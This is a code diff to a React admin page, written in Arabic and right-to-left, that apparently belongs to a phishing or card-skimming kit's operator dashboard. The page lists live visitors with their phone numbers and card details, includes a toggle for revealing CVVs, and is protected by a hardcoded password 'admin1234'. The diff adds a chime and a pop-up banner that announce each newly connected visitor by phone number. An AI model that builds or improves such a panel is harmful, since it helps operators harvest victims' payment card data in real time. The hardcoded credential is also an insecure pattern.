@@ -1,13 +1,34 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import {
   Shield, Users, Wifi, WifiOff, Trash2, Send, ChevronDown, ChevronUp,
-  RefreshCw, LogOut, Eye, EyeOff, CreditCard, Phone, Lock, Globe, Clock
+  RefreshCw, LogOut, Eye, EyeOff, CreditCard, Phone, Lock, Globe, Clock, Bell
 } from "lucide-react";
 import { adminApi, type Visitor } from "@/lib/api";
 
 const BRAND = { primary: "#1a3d6e", gold: "#c4923e", bg: "#0d1f35" };
 const POLL = 3000;
 const PASSWORD = "admin1234";
+
+function playConnectSound() {
+  try {
+    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
+    const now = ctx.currentTime;
+    const notes = [660, 880, 1100];
+    notes.forEach((freq, i) => {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(freq, now + i * 0.12);
+      gain.gain.setValueAtTime(0, now + i * 0.12);
+      gain.gain.linearRampToValueAtTime(0.25, now + i * 0.12 + 0.02);
+      gain.gain.exponentialRampToValueAtTime(0.001, now + i * 0.12 + 0.18);
+      osc.start(now + i * 0.12);
+      osc.stop(now + i * 0.12 + 0.2);
+    });
+  } catch {}
+}
 
 function timeAgo(ts: number) {
   const s = Math.floor((Date.now() - ts) / 1000);
@@ -55,11 +76,29 @@ export default function AdminPage() {
   const [expanded, setExpanded] = useState<string | null>(null);
   const [lastRefresh, setLastRefresh] = useState<Date | null>(null);
   const [showCvv, setShowCvv] = useState<Set<string>>(new Set());
+  const [newAlert, setNewAlert] = useState<string | null>(null);
+  const knownIds = useRef<Set<string>>(new Set());
+  const isFirst = useRef(true);
 
   useEffect(() => {
     if (!authed) return;
     const load = async () => {
       const data = await adminApi.getAll();
+
+      if (isFirst.current) {
+        data.forEach(v => knownIds.current.add(v.id));
+        isFirst.current = false;
+      } else {
+        const fresh = data.filter(v => !knownIds.current.has(v.id));
+        if (fresh.length > 0) {
+          playConnectSound();
+          const label = fresh[0].phone ? `${fresh[0].phone}` : "زائر جديد";
+          setNewAlert(label);
+          setTimeout(() => setNewAlert(null), 4000);
+          fresh.forEach(v => knownIds.current.add(v.id));
+        }
+      }
+
       setVisitors(data);
       setLastRefresh(new Date());
     };
@@ -115,6 +154,24 @@ export default function AdminPage() {
   return (
     <div className="min-h-screen" dir="rtl"
       style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(180deg, ${BRAND.bg} 0%, #0a1628 100%)` }}>
+
+      {/* NEW VISITOR ALERT */}
+      {newAlert && (
+        <div
+          dir="rtl"
+          className="fixed top-4 left-1/2 z-[100] flex items-center gap-3 px-5 py-3 rounded-2xl shadow-2xl text-white font-black text-sm animate-bounce"
+          style={{
+            transform: "translateX(-50%)",
+            background: "linear-gradient(135deg, #16a34a, #15803d)",
+            boxShadow: "0 8px 32px rgba(22,163,74,0.55)",
+            minWidth: "240px",
+            justifyContent: "center",
+          }}
+        >
+          <Bell className="w-5 h-5 flex-shrink-0" />
+          <span>🟢 زائر جديد متصل — {newAlert}</span>
+        </div>
+      )}
 
       {/* HEADER */}
       <header style={{ background: `${BRAND.primary}cc`, borderBottom: "1px solid rgba(255,255,255,0.1)" }} className="sticky top-0 z-50 backdrop-blur-md">
